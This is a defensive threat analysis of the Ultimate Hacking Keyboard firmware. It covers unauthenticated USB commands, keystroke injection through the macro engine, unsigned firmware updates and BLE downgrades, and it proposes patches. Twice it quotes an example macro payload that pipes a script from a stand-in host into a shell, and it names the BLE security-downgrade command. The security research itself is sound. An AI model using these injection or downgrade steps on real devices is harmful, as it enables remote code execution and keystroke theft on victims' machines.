# Cybersecurity Threat Analysis: Ultimate Hacking Keyboard Firmware

**Scope:** UHK60 (v1/v2) and UHK80 (left/right/dongle). Attack surfaces analyzed: USB HID protocol, macro engine, BLE stack, I2C module bus, firmware update pathway, and physical access.

**Threat model assumption:** The keyboard is treated as a high-value target because it sits in the HID chain of every keystroke — including passwords, MFA codes, and shell commands — and because it has the ability to synthesize keystrokes autonomously.

---

## 1. USB HID Protocol — Unauthenticated Command Execution

### Applies to: Both UHK60 and UHK80

The USB generic HID interface (`usb_protocol_handler.c`) accepts 63-byte command packets from any software process on the connected host that can open the HID device. There is **no authentication, session token, or capability check** on any USB command.

The full command surface is exposed to any unprivileged userspace process (or browser/Electron app via WebHID/WebUSB):

| Command ID | Effect |
|---|---|
| `0x01` `Reenumerate` | Boot into DFU/bootloader mode or normal mode |
| `0x05` `WriteHardwareConfig` | Overwrite the persistent 64-byte hardware identity (unique ID, ISO flag, etc.) |
| `0x06` `WriteStagingUserConfig` | Upload a complete replacement keymap and macro set |
| `0x07` `ApplyConfig` | Parse and activate the uploaded config |
| `0x10` `ExecMacroCommand` | Execute an arbitrary macro command string |
| `0x13` `ExecShellCommand` | (UHK80 only) Execute a Zephyr shell command |
| `0x11` `WriteModuleFirmware` | Upload firmware binary for a connected module |
| `0x12` `FlashModule` | Flash uploaded firmware to a connected module via K-boot |
| `0x02` `JumpToModuleBootloader` | (UHK60) Put a module into bootloader mode |
| `0x03` `SendKbootCommandToModule` | (UHK60 Buspal mode) Forward raw K-boot packets to a module |

**Attack scenario (Confused Deputy):** Malicious JavaScript via WebHID, a compromised Electron app (e.g., Agent itself if its supply chain is compromised), or a local low-privilege process can silently issue any of these commands. The browser/OS is the only gatekeeper, and WebHID prompts are one-time.

**Attack scenario (Rogue Config Upload):** An attacker with momentary access to a logged-in machine can upload a new config that adds a hidden macro mapping (e.g., replaces a rarely-used Fn layer key with a keystroke-injecting payload), then calls `ApplyConfig`. The change persists across reboots.

**Severity:** Critical. All privileged operations are conflated into a single unauthenticated endpoint.

**Mitigations to consider:** Require explicit user confirmation (physical button press) before accepting `WriteStagingUserConfig`/`ApplyConfig`/`Reenumerate`/`FlashModule`. Introduce a session token generated at USB enumeration that must be presented with sensitive commands.

---

## 2. Macro Engine as a Keystroke Injection and Privilege Escalation Path

### Applies to: Both UHK60 and UHK80

The macro engine (`right/src/macros/commands.c`) is Turing-complete and can be triggered in three ways:
- By a physical key mapped to a macro (legitimate user intent)
- Via `UsbCommand_ExecMacroCommand` over USB (see §1)
- Via the `$onInit` / `$onKeymapChange` / `$onJoin` macro events triggered by loading a config

Commands of particular concern from a security standpoint:

| Macro command | Security implication |
|---|---|
| `write STRING` | Synthesizes arbitrary keystrokes into the host, identical to physical typing |
| `tapKey` / `pressKey` / `holdKey` / `releaseKey` | Injects individual keystrokes and modifier combinations |
| `reboot` | Reboots the keyboard, including remote reboot of left half and dongle (UHK80) |
| `resetConfiguration` | Wipes the config — destructive/DoS |
| `bluetooth pair` | Puts the device into BLE pairing mode silently (UHK80) |
| `set bluetooth.allowUnsecuredConnections true` | Downgrades BLE security requirement from L4 (LESC) to L0 — enables MITM and eavesdropping |
| `unpairHost N` | Destroys a BLE bond |
| `switchHost N` | Silently switches the active BLE host |
| `set keymapAction.LAYERID.KEYID macro MACRONAME` | Remaps any key to any macro at runtime, persistently |
| `powerMode sleep` / `powerMode shutdown` | Cuts power to the keyboard — DoS |
| `freeze` / `panic` | Hang or crash the firmware — DoS |
| `set devMode true` | Enables extended debug output and additional diagnostic commands |
| `set emergencyKey KEYID` | Designates a key that cannot be remapped away |

The `write` command, combined with `$onInit`, means a malicious config can **auto-execute a keystroke injection payload the moment the keyboard is plugged in**, before the user has typed a single key. This is functionally equivalent to a BadUSB attack, but implemented in the keyboard's own config format rather than requiring a firmware modification.

**Attack scenario (Persistent BadUSB via Config):** An attacker uploads a config with `$onInit` containing:
```
write "curl http://evil.example/payload.sh | sh\n"
```
This executes a shell command on every machine the keyboard is plugged into, with no firmware modification required and no detection by USB scanning tools (the device legitimately identifies as a HID keyboard).

**Severity:** Critical for `write`/`tapKey` in `$onInit`. High for `resetConfiguration` and `set bluetooth.allowUnsecuredConnections`. Medium for `reboot`/`powerMode`.

**Mitigations to consider:** Rate-limit or gate `write`/`tapKey` commands when executed from USB-triggered macros vs. physical key press. Display a visual warning on the OLED (UHK80) or LED indicator (UHK60) when `$onInit` synthesizes keystrokes. Disable `bluetooth.allowUnsecuredConnections` in production builds.

---

## 3. Firmware Update — No Code Signing

### Applies to: Both UHK60 and UHK80

**Right half DFU (both platforms):** `UsbCommand_Reenumerate` with mode byte `EnumerationMode_Bootloader` transitions the device into its bootloader. On UHK60 this is the NXP K-boot bootloader; on UHK80 it is MCUboot. Once in bootloader mode, the Agent (or any attacker) can flash arbitrary firmware. The process requires no physical button press when triggered over USB.

The K-boot `flashSecurityDisable` command uses a hardcoded 8-byte unlock key `[0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]`. This key is embedded in the Agent source and provides no meaningful security.

**Module firmware (UHK60):** `JumpToModuleBootloader` (USB cmd `0x02`) + `SendKbootCommandToModule` (Buspal mode) allows the host to flash arbitrary firmware to any attached module (trackball, trackpoint, key cluster, touchpad). There is no cryptographic verification of module firmware images. The MD5 checksum fetched during module discovery is informational only.

**Module firmware (UHK80):** `WriteModuleFirmware` (USB cmd `0x11`) + `FlashModule` (USB cmd `0x12`) implement the same capability in-firmware. The right half stores the image and runs K-boot over UART.

**Attack scenario (Malicious Module Firmware):** A module is flashed with attacker-controlled firmware that logs keystrokes, manipulates pointer position, or exfiltrates data over an auxiliary channel. This persists independently of the right-half config and survives right-half firmware updates.

**Attack scenario (Right-Half Firmware Replacement):** A process issues `Reenumerate` + bootloader flash over USB. The new firmware may silently log all keystrokes and BLE keys, exfiltrating them to a secondary device.

**Severity:** Critical. Arbitrary code execution on the MCU, persistent across config resets.

**Mitigations to consider:** Require a physical button sequence to enter bootloader mode when the trigger arrives over USB (not Bluetooth or UART). Enable MCUboot image signing (the Zephyr/nRF infrastructure supports ECDSA-P256 signed images). Implement module firmware signature verification using the right half's built-in crypto.

---

## 4. BLE Security (UHK80-specific)

### Applies to: UHK80 right half, left half, dongle

### 4.1 Security level bypass via config

The firmware enforces `BT_SECURITY_L4` (LESC — LE Secure Connections with numeric comparison or OOB) for BLE HID connections in `bt_conn.c`:

```c
if (err || (level < BT_SECURITY_L4 && !Cfg.Bt_AllowUnsecuredConnections)) {
    safeDisconnect(conn, ...);
}
```

The config field `Cfg.Bt_AllowUnsecuredConnections` is set by the macro command `set bluetooth.allowUnsecuredConnections true`. This is documented as a development tool but is accessible in production firmware to anyone who can write a config. With this flag set, the keyboard will accept BLE HID connections at L0 (no encryption, no authentication), making all typed keystrokes trivially sniffable or subject to MITM.

### 4.2 Advertising and pairing exposure

The command `bluetooth pair` (accessible via macro or `ExecMacroCommand`) puts the device into `PairingMode_PairHid`, where it advertises and accepts new pairings. A rogue device in range can pair during this window. There is a 20-second timeout (`PAIRING_TIMEOUT`) for inter-half pairing and 120 seconds (`USER_PAIRING_TIMEOUT`) for user-facing HID pairing, but these windows can be reopened programmatically via repeated macro execution.

### 4.3 NUS inter-half link

The left-right connection uses the Nordic UART Service (NUS) over BLE, also at `BT_SECURITY_L4` by default. If the left half's bond database is corrupted (e.g., via `UsbCommand_EraseBleSetting` or `unpairHost`), the left half will advertise openly until re-paired — during which it is accessible to any BLE central.

### 4.4 Multi-host attack surface expansion

The `switchHost` macro command and support for up to 5 BLE host connections mean that a keyboard simultaneously bonded to a high-security machine and a lower-security machine can be used as a pivot: a macro triggered on the low-security machine can switch to the high-security host connection and inject keystrokes there.

**Severity:** High for `allowUnsecuredConnections` bypass; Medium for pairing exposure and multi-host pivot.

**Mitigations to consider:** Remove `set bluetooth.allowUnsecuredConnections` from production firmware builds (guard with a `CONFIG_UHK_DEV_MODE` Kconfig option). Require a physical button press to enter HID pairing mode. Log and display host-switching events on the OLED.

---

## 5. I2C Module Bus Trust (UHK60-specific)

### Applies to: UHK60 right half

The slave scheduler communicates with up to 8 I2C devices. Messages use CRC16 for integrity but **no authentication**. Hardcoded I2C addresses are:

| Device | Firmware address | Bootloader address |
|---|---|---|
| Left half | 0x08 | 0x10 |
| Left module | 0x18 | 0x20 |
| Right module | 0x28 | 0x30 |
| Touchpad | 0x2D | 0x6D |

**Attack scenario (Rogue I2C Device):** A hardware implant on the I2C bus can impersonate a module, respond to `SlaveCommand_RequestKeyStates` with fabricated key events (injecting keystrokes), and respond to property requests with arbitrary version strings and checksums — passing all firmware version checks. It could also impersonate a bootloader address to intercept K-boot flash operations.

**Attack scenario (I2C DoS):** A device holding the I2C bus SCL low (clock stretching attack) stalls the slave scheduler, hanging keyboard scan for the duration.

**Severity:** Medium (requires hardware access to the I2C lines, which typically means the case is open).

**Mitigations to consider:** Add challenge-response authentication to the module discovery protocol. Verify that the module ID returned matches the expected physical connector slot.

---

## 6. Configuration Parser Attack Surface

### Applies to: Both UHK60 and UHK80

The config parser (`right/src/config_parser/`) deserializes up to ~32 KB from the staging buffer into the runtime config struct. The macro engine then parses macro text as a DSL.

- **Buffer boundary:** The staging buffer write is size-limited at `uint16_t` offset (max 64 KB address space), but the actual buffer is 32 KB. Offsets near the boundary written via `WriteStagingUserConfig` could cause out-of-bounds writes if offset validation is incomplete.
- **String interpolation in macros:** The `write` and `setLedTxt` commands support `$variable` interpolation. Variables can be set via `setVar`. An attacker who can write a config can construct macros that evaluate and exfiltrate internal state via the `printStatus`/`notify`/`setLedTxt` output channels.
- **Macro loops:** The `while (true)` construct with `macroEngine.batchSize` controlling execution quota. A malicious macro with a tight infinite loop at maximum batch size will starve the main event loop, causing keyboard scan to lag — a software DoS.

**Severity:** Low to Medium. The parser itself is well-structured, but the attack surface is wide given the complexity of the macro DSL.

---

## 7. Physical Access

Physical access to the device bypasses most software controls and opens additional attack surfaces on both platforms.

**UHK60:** The EEPROM storing the user config and hardware config is accessible from the right half's I2C1 bus. An attacker with hardware access can read or overwrite it directly.

**UHK80:** The nRF SoC has a JTAG/SWD debug port. Without device-level readback protection (APPROTECT) enabled and locked, an attacker can extract flash contents or patch firmware in-place. Flash readback protection should be verified in production builds.

**Both:** The `reboot` macro command reboots the keyboard cleanly. If `Reenumerate` is mapped to `EnumerationMode_Bootloader` in a macro, the device enters DFU without any physical indicator other than USB re-enumeration. A macro bound to an obscure key combination could put a shared or kiosk keyboard into bootloader mode without the operator's knowledge.

---

## 8. Summary Risk Matrix

| Threat | Platform | Likelihood | Impact | Severity |
|---|---|---|---|---|
| Config upload → persistent BadUSB keystroke injection | Both | High (any local process) | Critical | **Critical** |
| `ExecMacroCommand` via USB → keystroke injection | Both | High | Critical | **Critical** |
| `Reenumerate` → arbitrary firmware flash, no signing | Both | High (local) | Critical | **Critical** |
| Module firmware replacement via K-boot | Both | High (local) | High | **High** |
| `allowUnsecuredConnections` → BLE eavesdropping/MITM | UHK80 | Medium (config write required) | High | **High** |
| Multi-host pivot via `switchHost` macro | UHK80 | Medium | High | **High** |
| BLE pairing window hijack | UHK80 | Medium (proximity required) | High | **High** |
| Rogue I2C device impersonating module | UHK60 | Low (hardware access) | Medium | **Medium** |
| Config parser edge cases / macro DoS | Both | Low | Medium | **Medium** |
| BLE NUS inter-half key exfiltration | UHK80 | Low (compromise required) | High | **Medium** |
| JTAG readback / flash dump | Both | Low (physical) | Critical | **Medium** |

---

## 9. Key Recommendations

1. **Require physical confirmation for privileged USB commands.** A single button press or key combination should be required before `ApplyConfig`, `Reenumerate(Bootloader)`, `FlashModule`, and `WriteModuleFirmware` take effect. This is the single highest-leverage mitigation.

2. **Enable firmware image signing.** Use MCUboot's ECDSA-P256 signing (already part of the Zephyr toolchain) for the right half and dongle. Add a signature check to module firmware before flashing via K-boot.

3. **Guard `$onInit` keystroke synthesis.** Prevent or visually flag `write`/`tapKey`/`pressKey` commands that execute within the first N seconds of device power-on or when triggered by `$onInit` without a physical key event in the chain.

4. **Remove `bluetooth.allowUnsecuredConnections` from production firmware.** It eliminates BLE LESC protections. Gate it behind a compile-time `CONFIG_UHK_DEV_MODE` Kconfig option.

5. **Enable nRF APPROTECT.** Lock SWD/JTAG access on production UHK80 firmware to prevent flash extraction.

6. **Audit the staging buffer offset arithmetic** in `usb_command_write_config.c` to confirm no offset overflows are possible at the `uint16_t` boundary.

7. **Log config writes on the OLED/display.** When a new config is applied from USB, briefly display a notification to alert a physically present user to an unexpected change.

---

## 10. Minimum Baseline for Remote Attacks

This section narrows scope to remote-only threats: a compromised host machine communicating over USB, and a BLE man-in-the-middle attacker. The four changes below address these without requiring physical access assumptions.

### 10.1 Guard `bluetooth.allowUnsecuredConnections` behind `devMode` — BLE MITM

**Risk eliminated:** A compromised host uploads a config containing `set bluetooth.allowUnsecuredConnections true`, downgrading the BLE security requirement from L4 (LESC) to L0 and making all subsequent keystrokes sniffable or MITM-able.

Without this flag the default `BT_SECURITY_L4` (LE Secure Connections via ECDH) makes passive eavesdropping and active MITM computationally infeasible on an established bond. This is the only code change needed for the BLE MITM threat — LESC itself is sound.

**Change:** In `right/src/macros/set_command.c`, where `Bt_AllowUnsecuredConnections` is written, add a devMode guard:

```c
// existing: Cfg.Bt_AllowUnsecuredConnections = value;
if (Cfg.DevMode) {
    Cfg.Bt_AllowUnsecuredConnections = value;
} else {
    Macros_ReportError("allowUnsecuredConnections requires devMode", NULL, NULL);
}
```

**Effort:** ~5 lines.

---

### 10.2 Require a physical button press to enter bootloader mode via USB — firmware replacement

**Risk eliminated:** Any process on the host calls `Reenumerate(EnumerationMode_Bootloader)`, then flashes arbitrary firmware. The new firmware is a persistent, detection-resistant keylogger or full implant.

**Change:** In `UsbCommand_Reenumerate`, reject bootloader-mode requests unless a `PhysicalConfirmation_IsActive()` flag is set — a flag raised in the key scan loop when a designated key is held, and cleared after a short window (e.g. 5 seconds). The normal Agent firmware-update flow prompts the user to hold that key before clicking "Update". Extend the same check to `UsbCommand_FlashModule`.

```c
void UsbCommand_Reenumerate(...) {
    uint8_t enumerationMode = GetUsbRxBufferUint8(1);
    if (enumerationMode == EnumerationMode_Bootloader && !PhysicalConfirmation_IsActive()) {
        SetUsbTxBufferUint8(0, UsbStatusCode_NotConfirmed);
        return;
    }
    // ... existing reboot logic
}
```

**Effort:** Medium — define `PhysicalConfirmation_IsActive()` in the key scan loop, check it in two USB command handlers.

---

### 10.3 Block keystroke synthesis in USB-originated macros — direct injection via `ExecMacroCommand`

**Risk eliminated:** A compromised host calls `UsbCommand_ExecMacroCommand` with a payload like `write "curl http://evil.example/payload.sh | sh\n"`, injecting a shell command as if typed by the user.

**Change:** Add an `isUsbOriginated` flag to `macro_state_t`. Set it in `UsbMacroCommand_ExecuteSynchronously()`. Check it in `processWriteCommand`, `processTapKeyCommand`, `processPressKeyCommand`, and `processHoldKeyCommand`:

```c
// In processWriteCommand / processTapKeyCommand / etc.:
if (S->ms.isUsbOriginated) {
    Macros_ReportError("Keystroke synthesis not allowed from USB-originated macros", NULL, NULL);
    return MacroResult_Finished;
}
```

Agent's "play macro" button uses `ExecMacroCommand` — legitimate non-injecting macros (`printStatus`, `switchKeymap`, etc.) continue to work. Only `write`/`tapKey`/`pressKey`/`holdKey`/`releaseKey` are blocked in this context.

**Effort:** Medium — one flag in `macro_state_t`, set in one place, checked in ~5 command handlers.

---

### 10.4 Block keystroke synthesis in `$onInit` for a short window after USB config apply — persistent BadUSB via config

**Risk eliminated:** A compromised host uploads a config with `$onInit` containing `write "..."`, calls `ApplyConfig`, and the keyboard auto-executes the payload the next time `$onInit` runs. This persists across host sessions.

**Change:** Record a `LastUsbConfigApplyTime` timestamp when `ApplyConfig` is processed over USB. Block keystroke synthesis commands (same handlers as §10.3) if that timestamp is more recent than a grace period (e.g. 10 seconds) and no physical key has been pressed since the apply. Show a visual indicator (LED/OLED) during the suppression window.

```c
// In UsbCommand_ValidateAndApplyConfig*:
Cfg.LastUsbConfigApplyTime = Timer_GetCurrentTime();

// In processWriteCommand (and tap/press/hold):
bool recentUsbApply = Timer_GetElapsedTime(&Cfg.LastUsbConfigApplyTime) < USB_CONFIG_GRACE_PERIOD_MS;
if (recentUsbApply && !Cfg.PhysicalKeyPressedSinceUsbApply) {
    Macros_ReportError("Keystroke synthesis suppressed after USB config apply", NULL, NULL);
    return MacroResult_Finished;
}
```

**Effort:** Low-Medium — one timestamp and one boolean in config, one check in the handlers already modified for §10.3.

---

### 10.5 Combined coverage

| Attack | Blocked by |
|---|---|
| BLE eavesdropping / MITM on established connection | §10.1 |
| BLE MITM during initial pairing | Already mitigated by LESC numeric comparison (user education) |
| Firmware replacement via USB bootloader trigger | §10.2 |
| Module firmware replacement via USB | §10.2 (extend to `FlashModule`) |
| Direct keystroke injection via `ExecMacroCommand` | §10.3 |
| Persistent BadUSB payload via `$onInit` in uploaded config | §10.4 |

**Remaining exposure after these changes:** A compromised host can still `resetConfiguration`, `reboot`, trigger `bluetooth pair`, and switch BLE hosts via macros or direct USB commands. These are disruptive but do not result in keystroke injection or persistent compromise. Closing these requires physical confirmation for `ApplyConfig` itself, which significantly impacts the normal Agent save workflow.
